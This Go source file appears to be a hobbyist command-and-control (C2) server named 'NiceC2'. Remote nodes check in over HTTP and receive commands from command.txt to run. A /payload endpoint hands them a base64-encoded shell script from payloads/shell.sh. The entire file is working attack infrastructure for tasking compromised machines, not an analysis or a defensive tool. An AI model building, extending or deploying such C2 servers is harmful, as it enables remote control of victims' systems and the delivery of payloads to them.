package main

import (
	b64 "encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/gorilla/mux"
)

type Command struct {
	NodeID  string `json:"NodeID"`
	Action  string `json:"Action"`
	Content string `json:"Command"`
}

func homePage(w http.ResponseWriter, r *http.Request) {
	fmt.Fprint(w, "Homepage endpoint hit")
}

type node_check_in struct {
	ID string
}

func nodeCheckIn(w http.ResponseWriter, req *http.Request) {

	dt := time.Now()
	fmt.Println(dt.String())

	// Decode the json body
	decoder := json.NewDecoder(req.Body)
	var node node_check_in
	err := decoder.Decode(&node)
	if err != nil {
		panic(err)
	}

	log.Println(node.ID + " Checked in")

	// Sending a nice response
	// fmt.Fprint(w, "Node has checked in!")

	//JSON reponse

	// Get a new command
	Command := refresh_commands()

	var response = []byte(`
	{
		"ID": "` + node.ID + `", 
		"command": "run", 
		"details": "` + Command + `"
	}`)

	fmt.Fprintf(w, string(response))

}

func nodeSendFile(w http.ResponseWriter, req *http.Request) {

	// Decode the json body
	decoder := json.NewDecoder(req.Body)
	var node node_check_in
	err := decoder.Decode(&node)
	if err != nil {
		panic(err)
	}

	script := read_script("payloads/shell.sh")

	var response = []byte(`
	{
		"ID": "` + node.ID + `",
		"command": "File",
		"details": "` + script + `"
	}`)

	fmt.Fprintf(w, string(response))

}

func handleRequests() {

	myRouter := mux.NewRouter().StrictSlash(true)

	myRouter.HandleFunc("/", homePage)

	// myRouter.HandleFunc("/test", shrug).Methods("GET")
	myRouter.HandleFunc("/checkin", nodeCheckIn).Methods("POST")

	myRouter.HandleFunc("/payload", nodeSendFile).Methods("POST")

	log.Fatal(http.ListenAndServe(":8081", myRouter))
}

func main() {

	fmt.Println("NiceC2 server")

	handleRequests()

}

func shrug() {
	fmt.Println("🤷")
}

func refresh_commands() string {

	//Reading the command file, this will be JSON at some point I reckon

	bFile, _ := ioutil.ReadFile("command.txt")
	command := string(bFile)
	command = strings.Replace(command, "\n", "", -1)

	return command
}

func read_script(path string) string {

	// Read the file
	bFile, _ := ioutil.ReadFile(path)
	script := string(bFile)
	// script = strings.Replace(script, "\n", "", -1)

	fmt.Println(script)

	// here is where we turn the file into some nice data I think
	encoded_script := b64.StdEncoding.EncodeToString([]byte(script))

	return encoded_script

}
